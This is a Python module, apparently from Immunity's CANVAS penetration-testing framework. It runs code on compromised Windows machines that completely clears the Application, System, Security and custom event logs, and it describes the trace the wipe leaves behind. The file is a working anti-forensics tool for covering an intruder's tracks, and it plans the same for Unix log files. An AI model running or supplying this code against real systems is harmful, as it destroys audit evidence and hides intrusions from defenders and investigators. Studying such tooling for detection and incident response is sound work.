#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
from exploitutils import *
import canvasengine
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

NAME                = "Clear Event Logs"
DESCRIPTION         = "Completely Clears the Application, System, And Security Event Logs in Windows"
VERSION             = "1.0"

DOCUMENTATION       = {}
DOCUMENTATION["NOTES"] = """This uses the Windows API ClearEventLog().  One of the side-effects of this API call is that if you use it to clear the Security Log then 1 entry will be left behind explaining that the logs were cleared.  The entry will look something like this:


The audit log was cleared 
 	Primary User Name:	SYSTEM
 	Primary Domain:    NT AUTHORITY
 	Primary Logon ID:	(0x0,0x3E7)
 	Client User Name:	Administrator
 	Client Domain:	        TEST
 	Client Logon ID:	(0x0,0x3833B)
"""
PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Windows"] ]


DEVNOTES="""

Soon this will also clean up selective log files in *nix targets.

"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.name           = NAME
        # windows Event Logs
        self.Application    = 0
        self.Security       = 0
        self.System         = 0
        self.custom         = ""
        # end windows
        self.Apache         = 0
        self.Syslog         = 0
        self.Varlog         = 0
        self.Email          = 0
        self.is_win64       = False
        return
    
    def clear_event_log_code(self):
        """
        Build the code to delete specified Event logs
        """
        vars={}
        
        patch = ""
        
        if self.Application == 1:
            patch += """

            h = OpenEventLogA(NULL, "Application");
            if(h)
            {   
            ClearEventLogA(h, NULL);
            CloseEventLog(h);
            }

            """
        if self.Security == 1:
            patch += """

            h = OpenEventLogA(NULL, "Security");
            if(h)
            {   
            ClearEventLogA(h, NULL);
            CloseEventLog(h);
            }

            """
        
        if self.System == 1:
            patch += """

            h = OpenEventLogA(NULL, "System");
            if(h)
            {   
            ClearEventLogA(h, NULL);
            CloseEventLog(h);
            }

            """
            
        if self.custom != "":
            patch += """

            h = OpenEventLogA(NULL, "%s");
            if(h)
            {   
            ClearEventLogA(h, NULL);
            CloseEventLog(h);
            }

            """%self.custom

        code="""
        #import "IMPORT_TYPE", "advapi32.dll|OpenEventLogA" as "OpenEventLogA"
        #import "IMPORT_TYPE", "advapi32.dll|ClearEventLogA" as "ClearEventLogA"
        #import "IMPORT_TYPE", "advapi32.dll|CloseEventLog" as "CloseEventLog"
        
        #import "local", "sendint" as "sendint"

        void main()
        {        
            HANDLE_TYPE h;

            %s

            sendint(1);
            return;
        }
        """%patch
        code = code.replace('IMPORT_TYPE', 'local' if self.is_win64 else 'remote')
        code = code.replace('HANDLE_TYPE', 'long long' if self.is_win64 else 'int')

        return self.node.shell.runCode(code, vars)
    
    def getArgs(self):        
        self.Application    = self.argsDict.get("Application",self.Application)
        self.Security       = self.argsDict.get("Security",self.Security)
        self.System         = self.argsDict.get("System",self.System)
        self.custom         = self.argsDict.get("custom",self.System)
        #might implement these later in a universal cleaner ...
        self.Apache         = self.argsDict.get("apachelogs",self.Apache)
        self.Email          = self.argsDict.get("emaillogs",self.Email)
        self.Syslog         = self.argsDict.get("syslogs",self.Syslog)
        self.Varlog         = self.argsDict.get("varlogs",self.Varlog)

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        self.getArgs()

        node        = self.argsDict["passednodes"][0]
        self.result = []

        
        for node in self.argsDict["passednodes"]:
            self.node       = node
            nodetype        = node.nodetype
            capabilities    = node.capabilities
            if nodetype in ['win64Node']:
                self.is_win64 = True
            else:
                self.is_win64 = False
            if "win32api" in capabilities:
                ret = self.clear_event_log_code()
                #self.log("Return result: 0x%08x" % ret)
                self.result += [ret]
                if ret:
                    if ret == 1:
                        self.log("Successfully cleared Event Logs. 0x%08x" % ret)
                else:
                    self.log("Couldn't clear Event Logs :( ")
            else:
                self.log("The node named %s of type %s does not have the capabilities needed to run this command"%(node.get_name(),nodetype))
                self.result += [0]

        if 1 in self.result:
            ret = 1
        else:
            ret = 0

        self.dispshellcmd = self.command
        self.setInfo("%s - (finished)" % (NAME))
        return ret

